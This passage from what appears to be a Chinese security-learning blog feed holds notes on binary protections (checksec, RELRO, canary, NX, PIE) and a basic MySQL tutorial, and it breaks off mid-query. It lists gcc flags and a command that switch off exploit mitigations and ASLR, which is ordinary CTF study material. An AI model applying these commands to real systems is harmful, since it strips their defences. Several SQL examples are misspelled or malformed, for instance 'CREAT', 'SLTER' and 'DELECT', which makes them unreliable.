id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>这不是个保护机制是个脚本软件。</p><p>checksec用来检查可执行文件的属性，查看文件开启了哪些保护机制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">checksec [filename]<br></code></pre></td></tr></table></figure><p>以之前一道 Pwn 题题目为例：<br><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_21-08-51.png"></p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>RELRO即为read only relocation，可以理解为我们熟悉的windows系统里的只读。</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。</p><h4 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o hello test.c // 默认情况下，是Partial RELRO<br>gcc -z norelro -o hello test.c // 关闭，即No RELRO<br>gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO<br>gcc -z now -o hello test.c // 全部开启，即Full RELRO<br></code></pre></td></tr></table></figure><h3 id="CANNARY（栈保护）"><a href="#CANNARY（栈保护）" class="headerlink" title="CANNARY（栈保护）"></a>CANNARY（栈保护）</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当启用栈保护后，函数开始执行的时候会先往栈里插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行。</p><p>在 Linux 中我们将 cookie 信息称为 canary。</p><h4 id="参数设置-1"><a href="#参数设置-1" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护<br>gcc -fstack-protector-all 启用保护，为所有函数插入保护<br>gcc -fstack-protector-strong<br>gcc -fstack-protector-explicit 只对有明确stack_protect attribute 的函数开启保护<br>gcc -fno-stack-protector 禁用保护<br></code></pre></td></tr></table></figure><h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX(DEP)"></a>NX(DEP)</h3><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p>NX 即 No-eXecute（不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h4 id="参数设置-2"><a href="#参数设置-2" class="headerlink" title="参数设置"></a>参数设置</h4><p>gcc 编译器默认开启了 NX 选项，如果需要关闭 NX 选项，可以给 gcc 编译器添加 - z execstack 参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c                    // 默认情况下，开启NX保护<br>gcc -z execstack -o test test.c        // 禁用NX保护<br>gcc -z noexecstack -o test test.c    // 开启NX保护<br></code></pre></td></tr></table></figure><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><h4 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h4><p>PIE即Position-Independent Executable（ 位置无关可执行文件），与ASLR 技术类似。</p><p>ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关，即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。</p><p>这就意味着，在 PIE 和 ASLR 同时开启的情况下，攻击者将对程序的内存布局一无所知，传统的改写GOT 表项的方法也难以进行，因为攻击者不能获得程序的.got 段的虚地址。</p><p>liunx 下关闭 PIE 的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><h4 id="参数设置-3"><a href="#参数设置-3" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c       // 默认情况下，不开启PIE<br>gcc -fpie -pie -o test test.c        // 开启PIE，此时强度为1<br>gcc -fPIE -pie -o test test.c        // 开启PIE，此时为最高强度2<br>gcc -fpic -o test test.c        // 开启PIC，此时强度为1，不会开启PIE<br>gcc -fPIC -o test test.c        // 开启PIC，此时为最高强度2，不会开启PIE<br></code></pre></td></tr></table></figure><hr><p>杂七杂八忙了一个周，抽时间学了这么点东西。我是菜鸡🥬</p><p>有看几道pwn题，发现大部分题目都是需要一些逆向技巧的，有些还会和web结合 <del>非常疯狂</del></p><p>如果有空web一些基础的东西我还是会继续学的，就熬夜吧熬夜吧🤪</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ubuntu</tag>
      
      <tag>x86汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL数据库基础</title>
    <link href="/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>又名：学了就忘只能再看从头重学😣</p><span id="more"></span><h1 id="01-phpstudy中MySQL的简单使用"><a href="#01-phpstudy中MySQL的简单使用" class="headerlink" title="01 phpstudy中MySQL的简单使用"></a>01 phpstudy中MySQL的简单使用</h1><p>在学用MySQL的时候发现自己和学习资料用的不是同一个集成环境，所以打开方式不一样，这种小问题还是难不倒我哒😎</p><p>首先开启MySQL服务    <del>好了接下来就不会了</del></p><p>再去小皮官网看看</p><p>有一个模块是phpMyAdmin的使用。按照官方教程下载好打开我才发现这是在网页上操作，不是命令行。没关系，下载都下载了，学习一下。</p><h4 id="001-图形化界面操作"><a href="#001-图形化界面操作" class="headerlink" title="001 图形化界面操作"></a>001 图形化界面操作</h4><p>在软件管理找到<strong>phpMyAdmin</strong>，点击下载。下载完之后点管理就会自动在浏览器打开，输入用户名和密码就可以使用啦。</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-29-51.png"></p><p>用户名和密码没改过的话就都是<strong>root</strong></p><p>在phpMyAdmin也可以用SQL查询语句嗷</p><blockquote><p>输入SELECT id FROM test ;</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-48-13.png"></p><p>使用其他界面操作内容时也可以预览SQL语句</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-51-03.png"></p><p>总之就是很简单易上手辣😇</p><p><del>连我都可以无师自通</del></p><h4 id="002-cmd操作"><a href="#002-cmd操作" class="headerlink" title="002 cmd操作"></a>002 cmd操作</h4><blockquote><p>MySQL在phpstudy_pro文件下的Extensions文件夹里</p></blockquote><p>进入bin目录后在此处打开cmd</p><p>输入<code>mysql -u[用户名] -p[密码] -h [数据库服务器地址]</code>进入</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-28-33.png"></p><p>用户名和密码没改过的话就都是<strong>root</strong>，打开本地数据库可以不加服务器地址</p><p>进入mysql之后就可以快乐使用了</p><h1 id="02-关于MySQL"><a href="#02-关于MySQL" class="headerlink" title="02 关于MySQL"></a>02 关于MySQL</h1><h4 id="001-MySQL常见符号"><a href="#001-MySQL常见符号" class="headerlink" title="001 MySQL常见符号"></a>001 MySQL常见符号</h4><h5 id="gt"><a href="#gt" class="headerlink" title="-&gt;"></a>-&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-29-23.png"></p><p>表示当前命令没有命令执行符或者等待命令执行符<code>;</code>或<code>\g</code>，也可以输入<code>\c</code>取消命令直接输入<code>;</code>回车即可执行命令。</p><h5 id="‘-gt-或”-gt"><a href="#‘-gt-或”-gt" class="headerlink" title="‘&gt;或”&gt;"></a>‘&gt;或”&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-33-39.png"></p><p>表示当前命令缺少<code>&#39;</code>或<code>&quot;</code></p><h4 id="002-MySQL编码规范"><a href="#002-MySQL编码规范" class="headerlink" title="002 MySQL编码规范"></a>002 MySQL编码规范</h4><ul><li><p>关键字与函数名称全部大写；（不大写也可以执行命令）</p></li><li><p>数据库名称、表名、字段名称全部小写；</p></li><li><p>必须以分号结尾</p></li></ul><h4 id="003-结构化查询语言"><a href="#003-结构化查询语言" class="headerlink" title="003 结构化查询语言"></a>003 结构化查询语言</h4><p>主要分为四类</p><p>DDL-数据库定义语言（CREATE DROP ALTER)</p><p>DML-数据库操作语言（INSERT DELETE UPDATE)</p><p>DQL-数据库查询语言（SELECT WHERE)</p><p>DCL-数据库控制语言</p><p><del>说了这么多也没什么用</del>🤪</p><h1 id="03-SQL语法"><a href="#03-SQL语法" class="headerlink" title="03 SQL语法"></a>03 SQL语法</h1><h3 id="对库的操作"><a href="#对库的操作" class="headerlink" title="对库的操作"></a>对库的操作</h3><h5 id="查找库"><a href="#查找库" class="headerlink" title="查找库"></a>查找库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW DATABASE; <br></code></pre></td></tr></table></figure><h5 id="创建库"><a href="#创建库" class="headerlink" title="创建库"></a>创建库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE [database_name];<br></code></pre></td></tr></table></figure><p>不知道即将创建的库是否存在时，可使用以下命令：如果库不存在就创建，存在则退出命令</p><p><code>CREATE DATABASE IF NOT EXISTS [database_name];</code></p><blockquote><p>但不建议让MySQL来做判断</p></blockquote><h5 id="删除库"><a href="#删除库" class="headerlink" title="删除库"></a>删除库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP DATABASE [database_name];<br></code></pre></td></tr></table></figure><p><strong>数据库不能修改名字</strong></p><h3 id="对表的操作"><a href="#对表的操作" class="headerlink" title="对表的操作"></a>对表的操作</h3><h5 id="查找表"><a href="#查找表" class="headerlink" title="查找表"></a>查找表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TABLES;         //查找当前库的所有表<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-25-02.png"></p><h5 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREAT TABLE [table_name](<br>    [column_name] [数据类型] [列的完整性约束]，<br>    ······<br>);<br></code></pre></td></tr></table></figure><blockquote><p>name为创建的表格名，可自行更改</p><p>空格里填表格表头及数据信息</p></blockquote><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE user(<br>    id INT AUTO_INCREMENT PRIMARY KEY,<br>    username VARCHAR(18) NOT NULL,<br>    pwd CHAR(32) NOT NULL,<br>    sex TINYINT NOT NULL DEFAULT 0,<br>    age TINYINT UNSIGNED NOT NULL<br>);<br></code></pre></td></tr></table></figure><blockquote><p>创建新表后，可以使用<code>desc table_name</code>查询表格信息</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-24-19.png"></p><p>数据类型</p><table><thead><tr><th>数据类型</th><th>说明</th></tr></thead><tbody><tr><td>Int</td><td>整数类型</td></tr><tr><td>char(n)</td><td>字符&#x2F;字符串，固定长度</td></tr><tr><td>varchar(n)</td><td>字符&#x2F;字符串，可变长度，最大长度为n</td></tr><tr><td>numeric(a,b)</td><td>精确数值，总位数为a，精确到小数点后第b位</td></tr><tr><td>date</td><td>时间，存储年月日的值</td></tr></tbody></table><p>字段约束</p><table><thead><tr><th>约束类型</th><th>说明</th></tr></thead><tbody><tr><td>UNSIGNED</td><td>只能用于数值整型，设置无符号。最大值不能超过255</td></tr><tr><td>ZEROFILL</td><td>只能用于数值整形，自动用0补全不足位数。eg：001</td></tr><tr><td>AUTO_INCREMENT</td><td>设置字段的自动增量属性，只能用于设置数值类型。</td></tr><tr><td>NULL&#x2F;NOT NULL</td><td>默认为NULL，即没有在此字段插入值。如果设置NOT NULL，则必须在此字段插入相应的值。</td></tr><tr><td>DEFAULT</td><td>通过此属性设置默认值</td></tr><tr><td>PRIMARY KEY</td><td>主键约束，主键自动为NOT NULL。</td></tr></tbody></table><blockquote><p>AUTO_INCREMENT必须和PRIMARY KEY一起用。自动增量必须为主键，但主键不一定要自动增量。</p></blockquote><h5 id="备份表"><a href="#备份表" class="headerlink" title="备份表"></a>备份表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE [new_table_name] SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] RENAME [new_table_name];<br></code></pre></td></tr></table></figure><h3 id="对字段的操作"><a href="#对字段的操作" class="headerlink" title="对字段的操作"></a>对字段的操作</h3><h5 id="添加字段"><a href="#添加字段" class="headerlink" title="添加字段"></a>添加字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] ADD [column_name] [数据类型] [完整性约束] [位置参数];<br></code></pre></td></tr></table></figure><blockquote><p>位置参数可空默认加在表的最后，也可使用FIRST或AFTER[字段名]</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-58-44.png"></p><h5 id="修改字段"><a href="#修改字段" class="headerlink" title="修改字段"></a>修改字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] MODIFY [column_name] [改后数据类型] [改后的完整性约束]；<br>SLTER TABLE [table_name] CHANGE [column_name] [new_column_name] [改后数据类型] [改后的完整性约束]；<br></code></pre></td></tr></table></figure><blockquote><p>MODIFY关键字只能改数据类型和完整性约束</p></blockquote><h5 id="删除字段"><a href="#删除字段" class="headerlink" title="删除字段"></a>删除字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] DROP [column_name];<br>ALTER TABLE [table_name] DROP [column_name1]，DROP [column_name2]，······；<br></code></pre></td></tr></table></figure><h3 id="对内容的操作"><a href="#对内容的操作" class="headerlink" title="对内容的操作"></a>对内容的操作</h3><h5 id="添加内容"><a href="#添加内容" class="headerlink" title="添加内容"></a>添加内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO [table_name](&#x27;[column_name1]&#x27;，&#x27;[column_name2]&#x27;，······) VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)；<br><br>INSERT INTO [table_name](&#x27;[column_name1]&#x27;，&#x27;[column_name2]&#x27;，······) VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)，(&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)，······；<br>//一次插入多条数据<br><br>INSERT INTO [table_name] VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)；<br></code></pre></td></tr></table></figure><blockquote><p>第二种方法必须严格按照表中顺序一一填写，自增字段可用null占位但不能为空</p></blockquote><p>我的电脑输入字段名不能加引号不然会报错<del>就离谱</del></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-18-09.png"></p><h5 id="查询内容"><a href="#查询内容" class="headerlink" title="查询内容"></a>查询内容</h5><ul><li>选择某一行或某一列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><ul><li>选择整个表格</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-19-13.png"></p><h5 id="删除字段-1"><a href="#删除字段-1" class="headerlink" title="删除字段"></a>删除字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELECT FROM [table_name] [删除条件]; <br></code></pre></td></tr></table></figure><blockquote><p>删除可使用where条件。条件可空，为空时全部值被影响。</p></blockquote><h5 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">UPDATE [table_name] SET [column_name]=[value] [修改条件];<br></code></pre></td></tr></table></figure><blockquote><p>修改条件可空，全部值被影响。</p></blockquote><h2 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h2><h4 id="distinct"><a href="#distinct" class="headerlink" title="distinct"></a>distinct</h4><p>去除重复值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DISTINCT [column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><p>where语句用于在表中选择指定符合条件的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE 条件（字段名+运算符+数值）;<br></code></pre></td></tr></table></figure><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>加</td></tr><tr><td>-</td><td>减</td></tr><tr><td>*</td><td>乘</td></tr><tr><td>&#x2F;或DIV</td><td>除</td></tr><tr><td>%或MOD</td><td>取余</td></tr></tbody></table><h5 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h5><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>&lt;&gt;或！&#x3D;</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td></tr><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>between</td><td>在某个范围内</td></tr><tr><td>like</td><td>模糊匹配</td></tr></tbody></table><blockquote><p>可以使用and或or连接多个条件</p></blockquote><p> <strong>like符号举例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">like &#x27;[查询内容]%&#x27;      //表示以[查询内容]开头的数据<br>like &#x27;%[查询内容]&#x27;      //表示以[查询内容]结尾的数据<br>like &#x27;%[查询内容]%&#x27;      //表示只要查询内容出现即可<br>like &#x27;_[查询内容]%&#x27;      //表示查询内容前有一位字符，后有任意字符<br>like &#x27;%[查询内容]_&#x27;      //表示查询内容前有任意字符，后有一位字符<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-52-05.png"></p><p> <strong>between用法</strong></p><p> between运算符包括起始值和结束值</p><p> 用于选取两个数值范围之内的值，可以是字符串，数字或者日期</p><p> eg:</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] where [colum_name] BETWEEN [value1] and [value2];<br><br>SELECT [colum_name] FROM [table_name] where [colum_name] &gt;= [value1] and [colum_name] &lt;= [value2];<br></code></pre></td></tr></table></figure><h5 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h5><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>NOT或！</td><td>逻辑非</td></tr><tr><td>AND</td><td>逻辑与</td></tr><tr><td>OR</td><td>逻辑或</td></tr><tr><td>XOR</td><td>逻辑异或</td></tr></tbody></table><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与</td></tr><tr><td>|</td><td>按位或</td></tr><tr><td>^</td><td>按位异或</td></tr><tr><td>!</td><td>取反</td></tr><tr><td>&lt;&lt;</td><td>左移</td></tr><tr><td>&gt;&gt;</td><td>右移</td></tr></tbody></table><h5 id="in"><a href="#in" class="headerlink" title="in"></a>in</h5><p>in实际上是多个or的合并</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],···);<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],···);<br><br>SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name]=[value1] or [colum_name]=[value2];<br></code></pre></td></tr></table></figure><h5 id="subquery"><a href="#subquery" class="headerlink" title="subquery"></a>subquery</h5><p>subquery为子查询，用于嵌套在where子句中的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name],···FROM [table_name] WHERE条件 (子查询)<br></code></pre></td></tr></table></figure><blockquote><p>子查询为一个完整的select语句</p></blockquote><h5 id="as"><a href="#as" class="headerlink" title="as"></a>as</h5><p>用as为查找对象起别名，但我没尝试成功🥲</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [字段名] FROM [table_name] [条件语句] as [别名]; <br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_21-10-56.png"></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h5 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a>count函数</h5><p>count函数统计符合条件的记录数</p><p>统计表中的记录<strong>总数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT(*) FROM [table_name];<br></code></pre></td></tr></table></figure><p>统计表中指定字段<strong>不为NULL</strong>的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><p>统计表中指定字段<strong>为NULL</strong>的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *FROM [table_name] WHERE [column_name] IS NULL;<br></code></pre></td></tr></table></figure><h5 id="max函数"><a href="#max函数" class="headerlink" title="max函数"></a>max函数</h5><p>max函数返回所选字段最大值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MAX([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="min函数"><a href="#min函数" class="headerlink" title="min函数"></a>min函数</h5><p>min函数返回所选字段最小值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MIN([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="avg函数"><a href="#avg函数" class="headerlink" title="avg函数"></a>avg函数</h5><p>avg函数返回所选字段的平均值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT AVG([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="sum函数"><a href="#sum函数" class="headerlink" title="sum函数"></a>sum函数</h5><p>sum函数返回所选按字段的合计值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT SUM([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h3 id="其他一些条件"><a href="#其他一些条件" class="headerlink" title="其他一些条件"></a>其他一些条件</h3><h5 id="having过滤分组"><a href="#having过滤分组" class="headerlink" title="having过滤分组"></a>having过滤分组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- having 统计函数 运算符 value；<br></code></pre></td></tr></table></figure><h5 id="group-by分组"><a href="#group-by分组" class="headerlink" title="group by分组"></a>group by分组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- GROUP BY [column_name];<br></code></pre></td></tr></table></figure><h5 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h5><p>可分为正序asc和倒序desc两种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- ORDER BY [column_name] [排序方法],[column_name] [排序方法],······;   <br></code></pre></td></tr></table></figure><h5 id="限制查询数量"><a href="#限制查询数量" class="headerlink" title="限制查询数量"></a>限制查询数量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- LIMIT [查询数量]<br></code></pre></td></tr></table></figure><h4 id="多表联合"><a href="#多表联合" class="headerlink" title="多表联合"></a>多表联合</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [table_name1].[column_name1],[table_name2].[column_name2] FROM [table_name1],[table_name2] + WHERE子句<br></code></pre></td></tr></table></figure><h5 id="jion连接"><a href="#jion连接" class="headerlink" title="jion连接"></a>jion连接</h5><p>jion连接是基于多个表之间的共同字段把他们结合起来进行查询的一种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name] AS FROM [table_name1] 